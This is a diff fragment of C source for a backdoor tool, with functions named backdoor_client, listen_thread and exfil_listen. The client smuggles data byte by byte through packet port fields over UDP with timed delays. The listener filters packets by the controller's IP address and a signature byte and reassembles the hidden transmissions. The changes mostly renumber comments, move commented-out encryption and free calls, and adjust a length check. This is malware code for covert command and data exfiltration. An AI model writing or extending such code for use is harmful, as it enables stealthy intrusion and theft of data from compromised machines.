@@ -66,10 +66,6 @@ void backdoor_client(uint32 ipaddr, int dport)
 
 //			enc = encrypt(SEKRET, frame, FRAM_SZ);
 
-//			sendto(sock, enc, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
-
-//			free(enc);
-
 			for (int j = 0; j < FRAM_SZ; ++j)
 			{
 				uint8 byte = frame[j];
@@ -80,6 +76,8 @@ void backdoor_client(uint32 ipaddr, int dport)
 				_send(ipaddr, src_port, dst_port, CHAN_UDP);
 				usleep(SLEEP_TIME);
 			}
+
+//			free(enc);
 		}
 
 		free(trans);
@@ -118,21 +116,22 @@ void *listen_thread(void *arg)
 		if (pack_len <= 0)
 			continue;
 
-		// Step 1: check IP address
+		// Step 2: check IP address
 		ip = ((uint32*)packet) + 3;
 		if (*ip != ipaddr)
 			continue;
 
-		// Step 2: check for signature
-
 		// Step 3: dump data into buffer
 		ptr = (char *)(packet + IP_LEN);
 
+		// Step 4: check for signature
 		if (*ptr == SIGNTR)
 			continue;
-
+		
+		// Step 5: Point to 2nd Byte
 		++ptr;
 
+		// Step 6: Decrypt and extract
 //		dec = decrypt(SEKRET, ptr, FRAM_SZ);
 		data = buf + buf_len;
 		memcpy(data, ptr, 1);
@@ -140,16 +139,16 @@ void *listen_thread(void *arg)
 
 		buf_len += 1;
 
-		// Step 4: see if we have a full transmission
+		// Step 7: see if we have a full transmission
 		data = getTransmission(buf, &buf_len, &type);
 		if (data == NULL)
 			continue;
 
-		// Step 5: show the results
+		// Step 8: show the results
 		if (type == RSP_TYP)
 			printf("Data: %s", data);
 
-		// Step 6: reset buffer
+		// Step 9: reset buffer
 		memset(buf, 0, MAX_LEN);
 		memset(packet, 0, MAX_LEN);
 		buf_len = 0;
@@ -192,8 +191,8 @@ void* exfil_listen(void *arg)
 		pack_len = read(sock, &packet, MAX_LEN);
 
 		// Step 1: locate the payload portion of the packet
-//		if (pack_len - IP_UDP_LEN <= 0)
-//			continue;
+		if (pack_len <= 0)
+			continue;
 
 		// Step 1: check IP address
 		ip = ((uint32*)packet) + 3;
